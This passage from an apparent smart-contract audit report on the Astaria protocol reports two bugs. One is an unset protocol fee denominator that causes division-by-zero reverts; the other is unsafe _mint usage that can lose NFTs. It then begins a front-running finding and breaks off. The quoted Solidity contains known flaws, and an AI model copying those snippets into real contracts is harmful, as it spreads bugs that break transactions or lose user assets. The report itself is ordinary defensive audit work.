class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">params</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>which calls:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"183\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_requestLienAndIssuePayout</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IAstariaRouter.Commitment </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">c</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newLienId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ILienToken.Stack[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slope</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payout</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_validateCommitment</span><span class=\"mtk1\">(</span><span class=\"mtk12\">c</span><span class=\"mtk1\">, </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">newLienId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">slope</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">ROUTER</span><span class=\"mtk1\">().</span><span class=\"mtk11\">requestLienPosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">c</span><span class=\"mtk1\">, </span><span class=\"mtk11\">recipient</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">payout</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_handleProtocolFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">c</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payout</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>which calls:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"184\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_handleProtocolFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">c</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"185\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_handleProtocolFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeTo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ROUTER</span><span class=\"mtk1\">().</span><span class=\"mtk11\">feeTo</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeOn</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">feeTo</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">feeOn</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ROUTER</span><span class=\"mtk1\">().</span><span class=\"mtk11\">getProtocolFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feeTo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>If the feeTo address is set, the code will query the protocol fee and deduct from the amount.</p>\n<p>which calls <code>ROUTER().getProtocolFee(amount)</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"186\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getProtocolFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RouterStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadRouterSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">protocolFeeNumerator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">protocolFeeDenominator</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>note that the <code>s.protocolFeeNumerator</code> and <code>s.protocolFeeDenominator</code> is not set in the init function of the AstariaRouter.sol, so if the feeTo address is set, transaction of commitToLien revert in division by zero error because <code>s.protocolFeeDenominator</code> is 0.</p>\n<p>In fact, if we look into getLiquidatorFee and getBuyoutFee</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"187\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getLiquidatorFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RouterStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadRouterSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationFeeNumerator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationFeeDenominator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getBuyoutFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">remainingInterestIn</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RouterStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadRouterSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">remainingInterestIn</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">buyoutFeeNumerator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">buyoutFeeDenominator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>If the <code>s.buyoutFeeDenominator</code> and <code>s.liquidationFeeDenominator</code> is 0, the divison by zero error can also occur, but these parameter is set in the init function of the AstariaRouter.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"188\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationFeeNumerator</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">130</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationFeeDenominator</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minInterestBPS</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">((</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e15</span><span class=\"mtk1\">) * </span><span class=\"mtk7\">5</span><span class=\"mtk1\">) / (</span><span class=\"mtk7\">365</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minEpochLength</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">7</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxEpochLength</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">45</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxInterestRate</span><span class=\"mtk1\"> = ((</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e16</span><span class=\"mtk1\">) * </span><span class=\"mtk7\">200</span><span class=\"mtk1\">) / (</span><span class=\"mtk7\">365</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//63419583966; // 200% apy / second</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">buyoutFeeNumerator</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">buyoutFeeDenominator</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>but <code>s.protocolFeeNumerator</code> and <code>s.protocolFeeDenominator</code> is not set in the init function of the AstariaRouter.sol is not set in the init function of the AstariaRouter.sol</p>\n<h3 id=\"recommended-mitigation-steps-58\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-58\" aria-label=\"recommended mitigation steps 58 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the protocol set the feeTo address and <code>s.protocolFeeNumerator</code> and <code>s.protocolFeeDenominator</code> together.</p>\n<p>Also validate the buyout fee, liqudatior fee and protocol fee’s dominator are not 0 to avoid division by zero error.</p>\n<h2 id=\"09-should-use-_safemint-instead-of-mint-in-collateraltokenonerc721received\" style=\"position:relative;\"><a href=\"#09-should-use-_safemint-instead-of-mint-in-collateraltokenonerc721received\" aria-label=\"09 should use _safemint instead of mint in collateraltokenonerc721received permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/83\">[09] Should use <code>_safeMint</code> instead of mint in CollateralToken#onERC721Received</a></h2>\n<p>In the current implementation of CollateralToken#onERC721Received, _mint is used instead of _safeMint, _safeMint checks that if the recipient is a contract, the receiver implements the onERC721Received hook to acknowledge that the contract is capable of receiving NFT to avoid loss of NFT ownership, however there is no such check in _mint, result in loss of NFT if the recipient is not designed to receive NFT.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"189\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">) || </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LIEN_TOKEN</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCollateral</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Asset</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">tokenContract:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">tokenId:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Deposit721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">from_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IERC721Receiver</span><span class=\"mtk1\">.</span><span class=\"mtk12\">onERC721Received</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-59\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-59\" aria-label=\"recommended mitigation steps 59 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the protocol use _safeMint instead of _mint when minting collateral token.</p>\n<h2 id=\"10-adversary-can-front-run-admins-state-update-and-parameter-update\" style=\"position:relative;\"><a href=\"#10-adversary-can-front-run-admins-state-update-and-parameter-update\" aria-label=\"10 adversary can front run admins state update and parameter update permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/78\">[10] Adversary can front-run admin’s state update and parameter update</a></h2>\n<p>Admin has the authorization to update the parameter setting such as fee, epoch length, liquidation auction window, enable / disable the flashAuction, pause the protocol by calling the file function in AstariaRouter.sol, CollateralToken.sol and LienToken.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"190\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">AstariaRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">272</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">273</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">file</span><span class=\"mtk1\">(</span><span class=\"mtk12\">File</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requiresAuth</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">274</span><span class=\"mtk1\">      </span><span class=\"mtk11\">_file</span><span class=\"mtk1\">(</span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">CollateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">205</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span 